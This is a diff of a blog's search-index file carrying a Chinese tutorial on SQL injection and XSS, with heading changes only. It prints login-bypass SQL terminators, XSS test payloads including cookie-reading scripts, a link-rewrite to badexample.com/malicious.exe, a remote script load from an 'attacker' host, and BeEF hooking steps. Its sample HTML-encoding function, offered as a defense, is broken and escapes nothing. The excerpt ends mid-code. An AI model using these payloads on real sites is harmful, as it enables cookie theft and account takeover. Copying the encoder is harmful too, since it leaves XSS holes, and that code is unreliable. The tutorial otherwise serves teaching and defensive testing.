@@ -56,7 +56,7 @@
   <entry>
     <title>web常见漏洞</title>
     <url>/2020/11/09/web%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<h1 id="gt-SQL注入"><a href="#gt-SQL注入" class="headerlink" title="-&gt;SQL注入"></a>-&gt;SQL注入</h1><h2 id="SQL注入定义"><a href="#SQL注入定义" class="headerlink" title="SQL注入定义"></a>SQL注入定义</h2><p>SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。</p>
+    <content><![CDATA[<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="SQL注入定义"><a href="#SQL注入定义" class="headerlink" title="SQL注入定义"></a>SQL注入定义</h2><p>SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。</p>
 <p><strong>结构化的查询语言</strong>（Structured Query Language），是关系型数据库通讯的标准语言。</p>
 <blockquote>
 <p>查询： <code>SELECT statement FROM table WHERE condition</code><br>删除记录： <code>DELETE FROM table WHERE condition</code><br>更新记录： <code>UPDATE table SET field=value WHERE condtion</code><br>添加记录： <code>INSERT INTO table field VALUES(values)</code></p>
@@ -204,9 +204,9 @@
 <p>第一句肯定是返回失败的，但是我们第二句会返回成功</p>
 <p>后面已经被我们注释掉了，是不会执行的，所以我们还是可以通过在<code>username</code>做这个手脚来绕过登录</p>
 <p>下面是我们常见的一些终止方式</p>
-<h5 id="终止字符串："><a href="#终止字符串：" class="headerlink" title="终止字符串："></a>终止字符串：</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-- ， #， %23， %00， &#x2F;*</span><br></pre></td></tr></table></figure>
+<h4 id="终止字符串："><a href="#终止字符串：" class="headerlink" title="终止字符串："></a>终止字符串：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-- ， #， %23， %00， &#x2F;*</span><br></pre></td></tr></table></figure>
 
-<h5 id="终止方法："><a href="#终止方法：" class="headerlink" title="终止方法："></a>终止方法：</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-- , ‘-- , ‘)-- , ) -- , ‘)) --, ))--</span><br></pre></td></tr></table></figure>
+<h4 id="终止方法："><a href="#终止方法：" class="headerlink" title="终止方法："></a>终止方法：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-- , ‘-- , ‘)-- , ) -- , ‘)) --, ))--</span><br></pre></td></tr></table></figure>
 
 <h2 id="SQL注入防范"><a href="#SQL注入防范" class="headerlink" title="SQL注入防范"></a>SQL注入防范</h2><p><strong>1，过滤特殊字符。</strong>过滤掉单引号，空格，双引号，select，update，deletd，insert into等字符。对于整数参数，加判断条件：不能为空、参数类型必须为数字。对于字符串参数，可以使用正则表达式进行过滤：如：必须为[0-9a-zA-Z]范围内的字符串</p>
 <p><strong>2，转译特殊符号</strong>。比如PHP的addslashes()函数，会对单引号，双引号，空格，NULL进行转义。</p>
@@ -218,32 +218,31 @@
 <p><img src="https://img-blog.csdnimg.cn/20190421214530209.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDcyMDc2Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <p><strong>4，设置数据库操作权限。</strong>比如只给普通用户查询权限，涉及到敏感操作，需要提升权限。</p>
 <p><strong>5，阿里云盾，360主机卫士,WAF。</strong></p>
-<h1 id="gt-跨站脚本攻击-XSS"><a href="#gt-跨站脚本攻击-XSS" class="headerlink" title="-&gt;跨站脚本攻击(XSS)"></a>-&gt;跨站脚本攻击(XSS)</h1><p>XSS定义</p>
-<h3 id="一-XSS的基本概念"><a href="#一-XSS的基本概念" class="headerlink" title="一.XSS的基本概念"></a>一.XSS的基本概念</h3><p>XSS又叫CSS (Cross Site Script) ，为了和css(层叠样式表)区分，我们通常称它为(xss)跨站脚本攻击。它指的是恶意攻击者往Web页面里插入恶意html代码，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到恶意的特殊目的。</p>
+<h1 id="跨站脚本攻击-XSS"><a href="#跨站脚本攻击-XSS" class="headerlink" title="跨站脚本攻击(XSS)"></a>跨站脚本攻击(XSS)</h1><p>XSS定义</p>
+<h3 id="XSS的基本概念"><a href="#XSS的基本概念" class="headerlink" title="XSS的基本概念"></a>XSS的基本概念</h3><p>XSS又叫CSS (Cross Site Script) ，为了和css(层叠样式表)区分，我们通常称它为(xss)跨站脚本攻击。它指的是恶意攻击者往Web页面里插入恶意html代码，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到恶意的特殊目的。</p>
 <p>xss是一种发生在web前端的漏洞，所以其危害的对象也主要是前端用户.在OWASP Web Application Top 10排行榜中长期霸榜，从未掉出过前三名。XSS这类安全问题发生的本质原因在于，浏览器错误的将攻击者提供的用户输入数据当做JavaScript脚本给执行了。</p>
 <p>XSS有几种不同的分类办法，例如按照恶意输入的脚本是否在应用中存储，XSS被划分为“存储型XSS”和“反射型XSS”，如果按照是否和服务器有交互，又可以划分为“Server Side XSS”和“DOM based XSS”。</p>
-<h3 id="二、XSS攻击的主要途径"><a href="#二、XSS攻击的主要途径" class="headerlink" title="二、XSS攻击的主要途径"></a>二、XSS攻击的主要途径</h3><p>XSS攻击方法只是利用HTML的属性，作各种的尝试，找出注入的方法。现在对三种主要方式进行分析。<br>1.第一种：对普通的用户输入，页面原样输出，用户通过对JSCODE的伪装，经过一些操作就会跳出一个木马界面，取得登录用户的Cookie.<br>2.第二种：在代码区里有用户输入的内容<br>原则就是，代码区中，绝对不应含有用户输入的东西。<br>3.第三种：允许用户输入HTML标签的页面。<br>用户可以提交一些自定义的HTML代码，这种情况是最危险的。因为，IE浏览器默认采用的是UNICODE编码，HTML编码可以用&amp;#ASCII方式来写，又可以使用”/”连接16进制字符串来写，使得过滤变得异常复杂</p>
-<h3 id="三、XSS攻击的危害包括："><a href="#三、XSS攻击的危害包括：" class="headerlink" title="三、XSS攻击的危害包括："></a>三、XSS攻击的危害包括：</h3><p>（1）窃取管理员帐号或Cookie，入侵者可以冒充管理员的身份登录后台。使得入侵者具有恶意操纵后台数据的能力，包括读取、更改、添加、删除一些信息。<br>（2）窃取用户的个人信息或者登录帐号，对网站的用户安全产生巨大的威胁。例如冒充用户身份进行各种操作。<br>（3）网站挂马。先将恶意攻击代码嵌入到Web应用程序之中。当用户浏览该挂马页面时，用户的计算机会被植入木马。<br>（4）发送广告或者垃圾信息。攻击者可以利用XSS漏洞植入广告，或者发送垃圾信息，严重影响到用户的正常使用。</p>
+<h3 id="XSS攻击的主要途径"><a href="#XSS攻击的主要途径" class="headerlink" title="XSS攻击的主要途径"></a>XSS攻击的主要途径</h3><p>XSS攻击方法只是利用HTML的属性，作各种的尝试，找出注入的方法。现在对三种主要方式进行分析。<br>1.第一种：对普通的用户输入，页面原样输出，用户通过对JSCODE的伪装，经过一些操作就会跳出一个木马界面，取得登录用户的Cookie.<br>2.第二种：在代码区里有用户输入的内容<br>原则就是，代码区中，绝对不应含有用户输入的东西。<br>3.第三种：允许用户输入HTML标签的页面。<br>用户可以提交一些自定义的HTML代码，这种情况是最危险的。因为，IE浏览器默认采用的是UNICODE编码，HTML编码可以用&amp;#ASCII方式来写，又可以使用”/”连接16进制字符串来写，使得过滤变得异常复杂</p>
+<h3 id="XSS攻击的危害包括："><a href="#XSS攻击的危害包括：" class="headerlink" title="XSS攻击的危害包括："></a>XSS攻击的危害包括：</h3><p>（1）窃取管理员帐号或Cookie，入侵者可以冒充管理员的身份登录后台。使得入侵者具有恶意操纵后台数据的能力，包括读取、更改、添加、删除一些信息。<br>（2）窃取用户的个人信息或者登录帐号，对网站的用户安全产生巨大的威胁。例如冒充用户身份进行各种操作。<br>（3）网站挂马。先将恶意攻击代码嵌入到Web应用程序之中。当用户浏览该挂马页面时，用户的计算机会被植入木马。<br>（4）发送广告或者垃圾信息。攻击者可以利用XSS漏洞植入广告，或者发送垃圾信息，严重影响到用户的正常使用。</p>
 <p>（5）控制受害者机器向其它网站发起攻击</p>
-<h3 id="四、XSS的分类"><a href="#四、XSS的分类" class="headerlink" title="四、XSS的分类"></a>四、XSS的分类</h3><p>XSS可以分为三种：反射型XSS（非持久型）、存储型XSS（持久型）和DOM XSS。</p>
+<h3 id="XSS的分类"><a href="#XSS的分类" class="headerlink" title="XSS的分类"></a>XSS的分类</h3><p>XSS可以分为三种：反射型XSS（非持久型）、存储型XSS（持久型）和DOM XSS。</p>
 <h4 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h4><p>用户在请求某条URL地址的时候，会携带一部分数据。当客户端进行访问某条链接时，攻击者可以将恶意代码植入到URL，如果服务端未对URL携带的参数做判断或者过滤处理，直接返回响应页面，那么XSS攻击代码就会一起被传输到用户的浏览器，从而触发反射型XSS。</p>
 <p>例如，当用户进行搜索时，返回结果通常会包括用户原始的搜索内容，如果攻击者精心构造包含XSS恶意代码的链接，诱导用户点击并成功执行后，用户的信息就可以被窃取，甚至可以模拟用户进行一些操作。它的利用过程如图所示。<br><img src="https://img-blog.csdnimg.cn/20200817215209903.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3diMTk5ODEx,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>反射型XSS不会永久存储用户的数据，仅发生在用户的一次访问过程之后。这个过程就像一次反射，因此得名反射型XSS。反射型XSS的触发条件比较苛刻，需要攻击者想方设法引导用户点击链接，但产生的危害不容忽视。</p>
 <h4 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h4><p>存储型XSS和反射型XSS的差别仅在于，提交的代码会存储在服务器端（数据库、内存、文件系统等），下次请求目标页面时不用再提交XSS代码。最典型的例子就是留言板XSS，用户提交一条包含XSS代码的留言存储到数据库，目标用户查看留言板时，那些留言就会从数据库中加载出来并显示，于是出发了XSS攻击<br><img src="https://img-blog.csdnimg.cn/20200817232149735.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3diMTk5ODEx,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
 <h4 id="DOM-XSS"><a href="#DOM-XSS" class="headerlink" title="DOM XSS"></a>DOM XSS</h4><p>DOM XSS和反射型XSS、存储型XSS的区别在于DOM XSS代码并不需要服务器参与，出发XSS靠的是浏览器的DOM解析，完全是客户端的事情，文档型的 XSS 攻击并不会经过服务端，而是作为中间人的角色，在数据传输过程劫持到网络数据包，然后修改里面的 html 文档，这样的劫持方式包括WIFI路由器劫持或者本地恶意软件等。</p>
-<h3 id="五、防范措施"><a href="#五、防范措施" class="headerlink" title="五、防范措施"></a>五、防范措施</h3><p>明白了三种XSS攻击的原理，我们能发现一个共同点 都是:<strong>让恶意脚本直接能在浏览器中执行</strong>。那么要防范它，就是要避免这些脚本代码的执行。<br><strong>简单来讲就是永远不要相信任何用户的输入！</strong><br>无论是在前端和服务端，都要<strong>对用户的输入进行转码或者过滤</strong>。</p>
+<h3 id="防范措施"><a href="#防范措施" class="headerlink" title="防范措施"></a>防范措施</h3><p>明白了三种XSS攻击的原理，我们能发现一个共同点 都是:<strong>让恶意脚本直接能在浏览器中执行</strong>。那么要防范它，就是要避免这些脚本代码的执行。<br><strong>简单来讲就是永远不要相信任何用户的输入！</strong><br>无论是在前端和服务端，都要<strong>对用户的输入进行转码或者过滤</strong>。</p>
 <p>当然也可以利用关键词过滤的方式，将 script 标签给删除。那么现在的内容只剩下:<br>什么也没有了:）</p>
-<h5 id="利用-CSP"><a href="#利用-CSP" class="headerlink" title="利用 CSP"></a>利用 CSP</h5><p>CSP，即浏览器中的内容安全策略，它的核心思想就是服务器决定浏览器加载哪些资源，具体来说可以完成以下功能:</p>
+<h4 id="利用-CSP"><a href="#利用-CSP" class="headerlink" title="利用 CSP"></a>利用 CSP</h4><p>CSP，即浏览器中的内容安全策略，它的核心思想就是服务器决定浏览器加载哪些资源，具体来说可以完成以下功能:</p>
 <p>限制其他域下的资源加载。<br>禁止向其它域提交数据。<br>提供上报机制，能帮助我们及时发现 XSS 攻击。</p>
-<h5 id="利用-HttpOnly"><a href="#利用-HttpOnly" class="headerlink" title="利用 HttpOnly"></a>利用 HttpOnly</h5><p>很多 XSS 攻击脚本都是用来窃取Cookie, 而设置 Cookie 的 HttpOnly 属性后，JavaScript 便无法读取 Cookie 的值。这样也能很好的防范 XSS 攻击。</p>
+<h4 id="利用-HttpOnly"><a href="#利用-HttpOnly" class="headerlink" title="利用 HttpOnly"></a>利用 HttpOnly</h4><p>很多 XSS 攻击脚本都是用来窃取Cookie, 而设置 Cookie 的 HttpOnly 属性后，JavaScript 便无法读取 Cookie 的值。这样也能很好的防范 XSS 攻击。</p>
 <h4 id="防御手册"><a href="#防御手册" class="headerlink" title="防御手册"></a>防御手册</h4><p><a href="https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet">https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet</a><br>自动检测dom缺陷的chrome插件 <a href="http://code.google.com/p/domsnitch/">http://code.google.com/p/domsnitch/</a></p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">****    XSS过滤绕过</span><br><span class="line">请参考 https:&#x2F;&#x2F;www.owasp.org&#x2F;index.php&#x2F;XSS_Filter_Evasion_Cheat_Sheet。</span><br><span class="line">        当网站应用清理输入、网站应用防火墙或浏览器内置的机制阻止恶意输入时，反射型xss就会被阻拦。但是测试者必须假定浏览器不会</span><br><span class="line">阻拦这类攻击，比如版本陈旧、内置安全功能被禁用等，并测试所有可能的漏洞。类似的，网站防火墙不能保证识别新奇的、未知的攻击。</span><br><span class="line">攻击者能构造防火墙无法识别的攻击字符串。</span><br><span class="line">        因此，防御xss攻击主要依赖网站应用清理不可信任的用户输入。有几种清理办法，比如返回错误、过滤或转义关键字。同时这些预防手段</span><br><span class="line">也造就了另外一个弱点：黑名单不可能囊括所有可能的攻击字符串、白名单可能过渡授权，这时清理就会失败，导致某类输入被不正确的信任</span><br><span class="line">并未被清理。</span><br><span class="line"></span><br><span class="line">****    攻击测试的例子</span><br><span class="line">    -   http:&#x2F;&#x2F;example.com&#x2F;index.php?user&#x3D;&lt;script&gt;alert(123)&lt;&#x2F;script&gt;</span><br><span class="line">    -   http:&#x2F;&#x2F;example.com&#x2F;index.php?user&#x3D;&lt;script&gt;window.onload &#x3D; function() &#123;var AllLinks&#x3D;document.getElementsByTagName(&quot;a&quot;);</span><br><span class="line">        AllLinks[0].href &#x3D; &quot;http:&#x2F;&#x2F;badexample.com&#x2F;malicious.exe&quot;; &#125;&lt;&#x2F;script&gt;</span><br><span class="line">    -   标签属性值</span><br><span class="line">        &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;state&quot; value&#x3D;&quot;INPUT_FROM_USER&quot;&gt;</span><br><span class="line">        &quot; onfocus&#x3D;&quot;alert(document.cookie)</span><br><span class="line">    -   不同的语法或编码</span><br><span class="line">        &quot;&gt;&lt;ScRiPt&gt;alert(document.cookie)&lt;&#x2F;ScRiPt&gt;</span><br><span class="line">            &quot;%3cscript%3ealert(document.cookie)%3c&#x2F;script%3e</span><br><span class="line">    -   非递归性过滤</span><br><span class="line">        &lt;scr&lt;script&gt;ipt&gt;alert(document.cookie)&lt;&#x2F;script&gt;</span><br><span class="line">    -   绕过正则过滤</span><br><span class="line">        模式串 $re &#x3D; &quot;&#x2F;&lt;script[^&gt;]+src&#x2F;i&quot;;</span><br><span class="line">        添加额外的属性，绕过  http:&#x2F;&#x2F;example&#x2F;?var&#x3D;&lt;SCRIPT%20a&#x3D;&quot;&gt;&quot;%20SRC&#x3D;&quot;http:&#x2F;&#x2F;attacker&#x2F;xss.js&quot;&gt;&lt;&#x2F;SCRIPT&gt;</span><br><span class="line">    -   HTTP parameter pollution</span><br><span class="line">        https:&#x2F;&#x2F;www.owasp.org&#x2F;index.php&#x2F;Testing_for_HTTP_Parameter_pollution_(OTG-INPVAL-004)</span><br><span class="line">        http参数污染，查询字符串或表单提交的参数中某个同名参数出现了多次，apache等web服务器解析协议参数时的方式各异，</span><br><span class="line">        网站应用程序的各个组件所使用的参数值不一致。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">**  存储型XSS测试</span><br><span class="line">*** 概述</span><br><span class="line">        存储型XSS是最危险的跨站脚本攻击。网站应用程序允许用户存储数据，这类网站就潜在的暴露在这类攻击面前。</span><br><span class="line">当网站应用从用户那里搜集输入的数据，然后存储起来以备后用，但这些输入没有经过正确的过滤，结果恶意数据被做为网站</span><br><span class="line">页面的一部分得以呈现，并运行在用户浏览器中且拥有网站应用程序所属用户的权限。</span><br><span class="line">        这种漏洞可以被用来实施基于浏览器的攻击：</span><br><span class="line">            -   劫持用户浏览器</span><br><span class="line">            -   捕获用户所浏览的网站敏感信息</span><br><span class="line">            -   对内网主机进行端口扫描</span><br><span class="line">            -   基于浏览器利用的定向投递</span><br><span class="line">        存储型xss不需要利用恶意链接，用户访问某个加载了之前存储的xss代码的页面时就会触发。攻击场景一般有下面几个阶段：</span><br><span class="line">            -   攻击者存储恶意代码到由漏洞的页面</span><br><span class="line">            -   用户通过应用程序的身份认证</span><br><span class="line">            -   用户访问漏洞页面</span><br><span class="line">            -   恶意代码被用户的浏览器执行</span><br><span class="line">        这类攻击可以结合浏览器利用框架比如beef、xss prox、backframe。这些框架允许复杂的脚本利用开发。</span><br><span class="line">        当访问漏洞页面的用户有比较高的权限时，这类攻击特别危险。比如当管理员访问漏洞页面时，这类攻击就自动被浏览器执行。</span><br><span class="line">这就可能暴露敏感信息比如会话令牌。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*** 如何测试</span><br><span class="line">****    黑盒测试</span><br><span class="line">        识别存储型漏洞的过程和之前测试反射型漏洞类似。</span><br><span class="line"> </span><br><span class="line">*****   输入表单</span><br><span class="line">    第一步是找出哪些地方的用户输入会被存储到后端并会被渲染显示在前端。典型的存储用户输入的地方有：</span><br><span class="line">        -   用户|配置，网站应用允许用户修改个人配置详细信息，比如姓名、昵称、头像、地址等；</span><br><span class="line">        -   购物篮，</span><br><span class="line">        -   文件管理器，应用程序允许文件上传</span><br><span class="line">        -   应用程序偏好设置</span><br><span class="line">        -   论坛|消息面板，允许用户之间互相发送消息</span><br><span class="line">        -   博客，允许用户留言评论</span><br><span class="line">        -   日志，如果网站应用将某些用户的输入存进日志</span><br><span class="line"></span><br><span class="line">*****   分析HTML代码</span><br><span class="line">    用户输入被网站应用存储后，一般会在显示时当做html标签的属性值。这一步中，最根本的是去理解输入部分被渲染显示时，</span><br><span class="line">在页面上下文中是怎么被安放的。所有可能被管理员看到的输入部分都需要被测试。</span><br><span class="line">比如，后台用户管理中某个用户的详细信息，有邮件：</span><br><span class="line">    &lt;input class&#x3D;&quot;inputbox&quot; type&#x3D;&quot;text&quot; name&#x3D;&quot;email&quot; size&#x3D;&quot;40&quot; value&#x3D;&quot;aaa@aa.com&quot; &#x2F;&gt;</span><br><span class="line">这时，可以在&lt;input&gt;标签后面注入恶意代码：</span><br><span class="line">    &lt;input class&#x3D;&quot;inputbox&quot; type&#x3D;&quot;text&quot; name&#x3D;&quot;email&quot; size&#x3D;&quot;40&quot; value&#x3D;&quot;aaa@aa.com&quot;&gt; MALICIOUS CODE &lt;!-- &#x2F;&gt;</span><br><span class="line"></span><br><span class="line">*****   试验是否可以注入</span><br><span class="line">    这就涉及输入验证、后端的过滤规则。比如注入：</span><br><span class="line">        aaa@aa.com&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;&#x2F;script&gt;</span><br><span class="line">        aa@aa.com%22%3E%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E</span><br><span class="line">    为了保证注入的数据被提交，通常需要暂时禁用浏览器的js代码执行、或在本地代理的http编辑器中修改请求的原始数据。</span><br><span class="line">    但是提交后，可能被网站应用程序过滤，比如script被替换成了空格或者空串，这就是一个潜在的过滤信号，当然有很多规避</span><br><span class="line">    过滤的技术。</span><br><span class="line"> </span><br><span class="line">*****   利用存储的注入代码</span><br><span class="line">    存储的恶意代码可以被高级js利用框架利用，比如beef、xss-proxy、backframe。</span><br><span class="line">    一个典型的beef利用场景涉及：</span><br><span class="line">        -   注入一段js钩子代码，可以与攻击者的浏览器利用框架通信</span><br><span class="line">        -   等待网站用户访问漏洞页面</span><br><span class="line">        -   通过beef控制台控制网站用户的浏览器</span><br><span class="line">    beef可以访问用户的cookies、屏幕截图、剪贴板、以及发起更复杂的xss攻击。如果这个漏洞页面会被拥有不同权限的用户访问，</span><br><span class="line">    那么这个攻击是相当有效的。</span><br><span class="line"></span><br><span class="line">*****   文件上传</span><br><span class="line">    如果网站应用允许文件上传，需要检测下是否可以上传html内容。如果html或txt文件被允许，那么xss负载就可以被注入。</span><br><span class="line">渗透测试人员应该验证是否这个上传点允许设置任意的MIME类型。这个设计缺陷允许浏览器的MIME误处理攻击。比如，看起来无害的</span><br><span class="line">JPG和GIF文件包含xss负载，可能在被浏览器载入的时候得到执行。这个是可能的，当本应设置MIME为image&#x2F;gif时却设置为text&#x2F;html。</span><br><span class="line">这种情况下，文件被客户端浏览器创建为HTML。</span><br><span class="line">    伪造POST请求：</span><br><span class="line">        Content-Disposition: form-data; name&#x3D;&quot;uploadfile1&quot;; filename&#x3D;&quot;C:\Documents and Settings\test\Desktop\test.gif&quot;</span><br><span class="line">        Content-Type: text&#x2F;html</span><br><span class="line"></span><br><span class="line">        &lt;script&gt;alert(document.cookie)&lt;&#x2F;script&gt;</span><br><span class="line"> </span><br><span class="line">**  DOM型XSS测试</span><br><span class="line">*** 概述</span><br><span class="line">    DOM型跨站脚本事实上是浏览器端的动态内容所引起的xss bug。典型的，比如js，获取用户输入并用它做了一些不安全的事情导致注入代码</span><br><span class="line">被执行。本文只是讨论 js bug 所引起的xss漏洞。</span><br><span class="line">    DOM，全称为Document Object Model，是一种结构化的格式，被用来表达浏览器中的文档。DOM允许动态脚本，比如js，来引用文档中的</span><br><span class="line">组件，比如表单字段、或会话令牌。DOM也被浏览器来实现安全策略，比如同源策略限制跨域DOM操作。当动态内容，比如js函数被一个构造的</span><br><span class="line">请求修改，dom元素可以被攻击者控制，从而形成xss漏洞。</span><br><span class="line">    很少有这方面的论文发表，因此它的含义和正规测试方法几乎没有标准的定义。</span><br><span class="line"> </span><br><span class="line">*** 如何测试</span><br><span class="line">    不是所有的xss bug都需要攻击者去控制从服务器返回的动态页面，但是泛滥的愚蠢的js编码会导致同样的结果。</span><br><span class="line">    与其他类型的xss漏洞（服务器未清理用户提交的参数，回传给用户浏览器端并得到执行）相比，dom-xss 可以控制代码的执行流程。</span><br><span class="line">    大多数情况下，dom-xss可以在服务端不知情的情况下执行。比如：</span><br><span class="line">        &lt;script&gt;</span><br><span class="line">            document.write(&quot;Site is at: &quot; + document.location.href + &quot;.&quot;);</span><br><span class="line">        &lt;&#x2F;script&gt;</span><br><span class="line">攻击者追加#&lt;script&gt;alert(&#39;xss&#39;)&lt;&#x2F;script&gt;到页面的url后面，当执行时会弹窗。这个例子中，追加的代码不会被发送到服务端，因为#</span><br><span class="line">后面的字符串根本没有被浏览器当做查询字符串的一部分，而是作为一个锚标记，因而无需和服务器取得联系。</span><br><span class="line">    dom-xss的攻击后果和其他更知名的xss攻击一样广泛，cookies获取、更进一步的恶意脚本注入，所以应该被划分到同样的严重等级。</span><br><span class="line"> </span><br><span class="line">****    黑盒测试</span><br><span class="line">    dom-xss的黑盒测试是不必要的，因为前端的源码总是可见的，浏览器需要从服务端那获取并执行。</span><br><span class="line"> </span><br><span class="line">****    灰盒测试</span><br><span class="line">    js应用程序和其他的应用程序有显著的区别，因为他们是由服务端动态产生的，为了理解什么代码正在被执行，测试者需要爬行站点来</span><br><span class="line">判定正在被执行的脚本和哪些地方是接收用户输入的。许多站点依赖大量的库函数，伸展开后有成百上千行代码并且不是内部开发的。这种</span><br><span class="line">情况下，自顶向下的测试常常是唯一可行的选择，因为许多底层的函数从没用到过，从中分析哪些是弱点耗费太多时间。对于自顶向下测试，</span><br><span class="line">是否能识别哪些地方接收用户输入同样至关重要。</span><br><span class="line">    用户输入来源有两种形式：</span><br><span class="line">        -   服务端动态写入，不允许直接的xss</span><br><span class="line">        -   客户端脚本对象中获取的变量</span><br><span class="line">    下面是服务端插入数据到js脚本中的两个例子：</span><br><span class="line">        var data &#x3D; &quot;&lt;escaped data from the server&gt;&quot;;</span><br><span class="line">        var result &#x3D; someFunction(&quot;&lt;escaped data from the server&gt;&quot;);</span><br><span class="line">    下面是从客户端js对象中获取输入的两个例子：</span><br><span class="line">        var data &#x3D; window.location;</span><br><span class="line">        var result &#x3D; someFunction(window.referer);</span><br><span class="line">    对于js代码来说，两种获取输入的方式基本没有差异，重要的是当从服务端获取输入时，服务端能对数据应用任何的排列组合，</span><br><span class="line">然而js对象中获取的输入却很好理解。所以，如果上例中的js函数是弱点的话，前例中的漏洞利用依赖服务端的过滤，后例中的</span><br><span class="line">利用依赖于浏览器对window.referer对象的编码。 参考 https:&#x2F;&#x2F;code.google.com&#x2F;p&#x2F;domxsswiki&#x2F;wiki&#x2F;LocationSources</span><br><span class="line">    另外，js脚本也常常会在script标签外部执行，过去许多的攻击向量都导致了xss攻击已经证实了这一点。所以，在爬行站点时，</span><br><span class="line">留意诸如‘事件处理器’、‘带有expression属性的css语句块’等这些地方的代码是很重要的。</span><br><span class="line">    自动化测试在识别和验证dom-xss漏洞时是很弱的，因为他仅仅是发送特定的负载并尝试审查服务器响应的页面。这个可能在一些</span><br><span class="line">简单的例子中工作得比较好，比如那些参数被反射回给用户的情况：</span><br><span class="line">        &lt;script&gt;</span><br><span class="line">            var pos&#x3D;document.URL.indexOf(&quot;message&#x3D;&quot;)+5;</span><br><span class="line">            document.write(document.URL.substring(pos,document.URL.length));</span><br><span class="line">        &lt;&#x2F;script&gt;</span><br><span class="line">但是下面不自然的例子无法被检测到：</span><br><span class="line">        &lt;script&gt;</span><br><span class="line">            var navAgt &#x3D; navigator.userAgent;</span><br><span class="line">  </span><br><span class="line">            if (navAgt.indexOf(&quot;MSIE&quot;)!&#x3D;-1) &#123;</span><br><span class="line">                document.write(&quot;You are using IE as a browser and visiting site: &quot; + document.location.href + &quot;.&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">                document.write(&quot;You are using an unknown browser.&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &lt;&#x2F;script&gt;</span><br><span class="line">    基于这样的原因，自动化测试通常无法检测dom-xss漏洞，除非测试工具能对客户端脚本执行额外的分析。</span><br><span class="line">    人工测试应该进行，检查某些代码区域，那些区域中的参数对攻击者而言是有用的。比如，代码被动态写到页面、dom树被修改、</span><br><span class="line">甚至脚本被直接执行。参考 http:&#x2F;&#x2F;www.webappsec.org&#x2F;projects&#x2F;articles&#x2F;071105.shtml</span><br></pre></td></tr></table></figure>
 
-<h3 id="六、抵御XSS"><a href="#六、抵御XSS" class="headerlink" title="六、抵御XSS"></a>六、抵御XSS</h3><p>抵御XSS攻击，只需做到两点即可：<br>1、所有前端的页面渲染，尽量使用ajax异步进行，从后台获取要显示的数据。<br>2、前端提交过来的数据，在后台入口处统统对HTML中的关键字进行html编码转义。<br>做到上面方可基本无忧。</p>
+<h3 id="抵御XSS"><a href="#抵御XSS" class="headerlink" title="抵御XSS"></a>抵御XSS</h3><p>抵御XSS攻击，只需做到两点即可：<br>1、所有前端的页面渲染，尽量使用ajax异步进行，从后台获取要显示的数据。<br>2、前端提交过来的数据，在后台入口处统统对HTML中的关键字进行html编码转义。<br>做到上面方可基本无忧。</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  &#x2F;* 1.用正则表达式实现html转码 *&#x2F;</span><br><span class="line">  htmlEncodeByRegExp(str) &#123;</span><br><span class="line">    let s &#x3D; &#39;&#39;;</span><br><span class="line">    if (str.length &#x3D;&#x3D;&#x3D; 0) return &#39;&#39;;</span><br><span class="line">    s &#x3D; s.replace(&#x2F;&lt;&#x2F;g, &#39;&lt;&#39;);</span><br><span class="line">    s &#x3D; s.replace(&#x2F;&gt;&#x2F;g, &#39;&gt;&#39;);</span><br><span class="line">    s &#x3D; str.replace(&#x2F;&amp;&#x2F;g, &#39;&amp;&#39;);</span><br><span class="line">    s &#x3D; s.replace(&#x2F; &#x2F;g, &#39;&amp;nbsp;&#39;);</span><br><span class="line">    s &#x3D; s.replace(&#x2F;\&#39;&#x2F;g, &#39;&#39;&#39;); &#x2F;&#x2F;eslint-disable-line</span><br><span class="line">    s &#x3D; s.replace(&#x2F;\&quot;&#x2F;g, &#39;&quot;&#39;); &#x2F;&#x2F;eslint-disable-line</span><br><span class="line">    return s;</span><br><span class="line">  &#125;,</span><br><span class="line">  &#x2F;* 2.用正则表达式实现html解码 *&#x2F;</span><br><span class="line">  htmlDecodeByRegExp(str) &#123;</span><br><span class="line">    let s &#x3D; &#39;&#39;;</span><br><span class="line">    if (str.length &#x3D;&#x3D;&#x3D; 0) return &#39;&#39;;</span><br><span 